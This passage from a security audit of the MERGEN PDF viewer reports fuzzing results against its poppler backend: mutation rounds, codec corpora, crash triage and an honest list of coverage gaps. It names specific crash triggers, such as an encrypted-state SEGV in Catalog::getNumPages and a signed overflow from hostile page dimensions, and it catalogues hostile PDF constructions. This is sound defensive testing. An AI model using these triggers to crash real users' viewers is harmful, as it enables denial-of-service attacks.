keywords), chunk duplication, chunk deletion, cross-seed splicing. Harness: the full stage sweep
(open -> unlock -> pageCount -> contentHash -> outline -> properties -> pageSize sweep -> words ->
search -> pageLinks -> render 1.0 -> render 600 dpi -> `PageView::setDocument` -> zoom 10 ->
fitPage -> rotate x2 -> scrollToPage -> `linkAt` sweep -> zoom 0.1 -> `openData`) under Release +
ASAN + UBSan, `timeout -s KILL 10` per file, 8-way parallel.

| result | count |
|---|---|
| OK | 4 000 |
| faults | **0** |

Coverage check: 233 of a 300-mutant sample loaded successfully (`LoadStatus::Ok`), i.e. **~78 %**
of mutants were genuinely exercised through every stage rather than rejected at the door. Naive
byte-level mutation of MERGEN's own test corpus produced **no faults at all**. That is a real
result: the plain parse/render/extract path is not fragile against random corruption, and poppler's
xref reconstruction absorbs most of it.

**Round 2 — 6 000 mutations, structure-aware seeds.**
Same strategies plus a numeric-field scrambler that rewrites digit runs to extremes, seeded from
the repo files **plus 28 adversarial corpus files** (cyclic outlines, absurd MediaBoxes, the
encryption variants, hostile links, self-referential `/Annots` and `/Pages`, broken xrefs, lying
`/Count`, corrupt fonts).

| result | count |
|---|---|
| OK | 5 516 |
| ASAN (SEGV) | 295 |
| UBSAN | 189 |
| **total faults** | **484** |

Load-status spread: 4 088 `Ok`, 1 617 `Invalid`, 295 `NeedsPassword`.

**Triage — every one of the 484 faults collapses to two already-reported signatures:**

| count | signature | finding |
|---|---|---|
| 295 | `SEGV :: Catalog::getNumPages` | F-01 |
| 189 | `signed integer overflow :: PageView::restoreAnchor :: src/pageview.cpp:1087` | F-04b |

**No new bug class was discovered by mutation.** The two known defects were rediscovered
independently, which is a useful confirmation of their reachability from arbitrary byte-level
damage rather than only from hand-built structures.

The 295 figure is exactly the number of mutants that reached `LoadStatus::NeedsPassword`. That is
worth stating plainly: **100 % of mutants that land in the encrypted state crash the harness** —
F-01 is not a corner case reachable only by a carefully built file, it is what happens every single
time a document presents itself as encrypted.

**Grand total: 10 000 mutations, 484 faults, 2 distinct root causes, 0 previously-unknown.**

---

## Image codecs and embedded-font rasterisation — clean

Historically poppler's densest CVE surface is its image decoders, so a dedicated corpus was built
(`/tmp/fz/gen_codecs.py`, 32 documents): six random-payload **JBIG2** images plus one with a
`/JBIG2Globals` stream at 1024x1024; four **JPX**/JPEG-2000 with a valid JP2 signature box followed
by random bytes; four **CCITTFaxDecode** with hostile `/DecodeParms` (`/K -1/0/1`, `/Columns 17`,
`/Columns 100000`, `/Rows 5000`); four corrupt **DCTDecode** (valid JFIF header, random entropy
data); three **LZWDecode** and three **RunLengthDecode**; four **FlateDecode** with hostile PNG
predictors (`/Predictor 15` with `/Columns 0`, `/Columns 1000000`, `/Colors 0`, `/Colors 200`); and
three documents that force **glyph rasterisation of a corrupt embedded font** (`/FontFile`,
`/FontFile2`, `/FontFile3` each 60 KB of random bytes, with a content stream that actually draws
44 glyphs at 48 pt so the font is really loaded, not merely enumerated).

Every one of the 32 ran the full stage sweep under Release+ASAN+UBSan with **no fault**:

```
jbig2_fuzz0..5      OK    jbig2_globals   OK    jpx_fuzz0..3    OK
ccitt_fuzz0..3      OK    dct_fuzz0..3    OK    lzw_fuzz0..2    OK
rle_fuzz0..2        OK    pred_fuzz0..3   OK    fontrender_0..2 OK
```

This is a **negative result and it belongs to poppler, not to MERGEN**: these decoders are the
most-fuzzed code in the project's history (OSS-Fuzz has run continuously against them for years) and
poppler 26.08.0 absorbed everything thrown at it here. MERGEN benefits from that hardening without
contributing to it — the same way it benefits from poppler's outline cycle detection (F-03) and its
`Bogus memory allocation size` clamp in the rasteriser (F-05).

A further **2 000 mutations** seeded from that codec corpus (bit flips, byte overwrites, truncation,
and numeric-field scrambling of `/Width`, `/Height`, `/Columns`, `/BitsPerComponent`, `/Predictor`)
produced **1 995 OK and 5 faults — all five the same `pageview.cpp:1087` signed overflow as F-04b**,
reached this time through a mutated image or MediaBox dimension rather than a hand-built one. No
decoder fault of any kind. That F-04b turns up from this direction too is worth noting: the defect
is reachable from any document-controlled number that becomes a page dimension, not only from a
deliberately absurd `/MediaBox`.

---

## Coverage — what was and was not done

**Totals.** 12 000 mutations run (4 000 naive + 6 000 structure-aware + 2 000 codec-targeted),
489 faults, **2 distinct root causes**, 0 previously-unknown. Plus ~100 hand-built adversarial
documents across 10 attack families. All findings were confirmed on the **shipped Release
configuration**, not only on the Debug build where sanitizer asserts are active.

**Covered.**
Recursive and cyclic structures (outline `/First` self-loop, two-node cycle, `/Next` sibling loop,
10 k and 200 k nesting depth; `/Pages` self-reference, two-node cycle, 5 000-level nesting).
Absurd geometry (`/MediaBox` of `1e9`, `INT_MAX`, `INT64_MAX`, `1e18`, `1e400`, zero, negative,
inverted, non-numeric, short array; `/UserUnit 1e9`). Page-count abuse (lying `/Count`, negative
`/Count`, shared-page-object trees, and genuine 100 k / 300 k distinct-page documents). Malformed
structure (six truncation points, broken xref offsets, missing xref, lying `/Size`, missing `/Root`,
`%PDF-` + 4 KB of random bytes, empty file, circular object references, `/Length` of `INT_MAX` and
`-1`). Decompression bombs (1 GB flate content stream, six-deep nested flate, 512 MB image XObject).
Fonts (5 000 on one page, 40 000 across 2 000 pages, corrupt TrueType/CFF, and forced glyph
rasterisation of corrupt `/FontFile`, `/FontFile2`, `/FontFile3`). Annotations (50 000 on one page,
absurd `/Rect`, malformed and non-numeric `/QuadPoints`, self-referential `/Annots`). Links
(200 000 on one page, destinations of `INT_MAX` and `-5`, `/GoToR`, `/URI`, `/Launch`). Encryption
(real AES-256, unsupported handler, bogus version, empty dict, dangling ref, fake Standard dict,
2 000 repeated `unlock()` calls). Image codecs (JBIG2 + globals, JPX, CCITT, DCT, LZW, RunLength,
hostile flate predictors). The claimed guarantees (network, JavaScript, forms, URLs, `/Launch`,
embedded-file execution, XXE) via an `LD_PRELOAD` syscall interposer against both the harness and
the real binary. Compare-mode amplification. The 600 DPI print path.

**Not covered — honestly.**
- **Coverage-guided fuzzing.** All mutation here was blind. No libFuzzer or AFL++ harness was built,
  so reach into deep parser states is far weaker than a coverage-guided campaign would achieve. This
  is the single biggest gap; the 0-fault round 1 result should be read with it in mind.
- **JBIG2/JPX beyond random payloads.** The codec documents carry random bytes behind a valid
  header. Structurally *valid but malicious* JBIG2 segment tables — the shape of most historical
  poppler JBIG2 CVEs — were not constructed.
- **Object streams and xref streams.** The corpus is almost entirely classic-xref. `/ObjStm` and
  cross-reference-stream documents were only incidentally covered via mutation.
- **Concurrency.** `SearchWorker` opens its **own** poppler handle on the same file
  (`document.cpp:437-441`) while the main thread renders from another. That two-handle,
  two-thread arrangement against a hostile document was not fuzzed at all, and it is the most
  plausible remaining place for a memory-safety bug rather than a DoS.
- **Redaction.** `redact.cpp` feeds attacker-controlled documents to qpdf's *writer*. Explicitly
  another agent's scope (`H1-redact.md`), so not fuzzed here — but hostile input into a PDF writer
  is a real surface and someone should own it.
- **Interactive UI fuzzing.** No randomised key/mouse event streams against a hostile document; the
  paint path was exercised only through `setDocument`/`setZoom`/`rotate`, never through real
  `paintEvent` dispatch under a compositor.
- **Encryption variants.** No RC4 (qpdf refuses to emit weak crypto without `--allow-weak-crypto`),
  no owner-password-only `/R 6`, no public-key (PKCS#7) handler.
- **Soak.** No multi-hour run; longest single measurement was 300 s.
- `valgrind`, `cppcheck` and `clazy` were available and not used — ASAN + UBSan covered the
  memory-error ground more cheaply, but a `valgrind` pass might still find uninitialised reads that
  ASAN does not model.

**Reproduction.** All triggering files are in `docs/audit/corpus/`, alongside the generators
(`mkpdf.py`, `gen_corpus.py`, `gen2.py`, `mutate2f.py`), the harness (`fuzz.cpp`), the probes
(`probe_lock.cpp`, `probe_each.cpp`, `probe_cmp.cpp`) and the syscall interposer (`netwatch.c`).
Build and run instructions are in the Method section at the top.
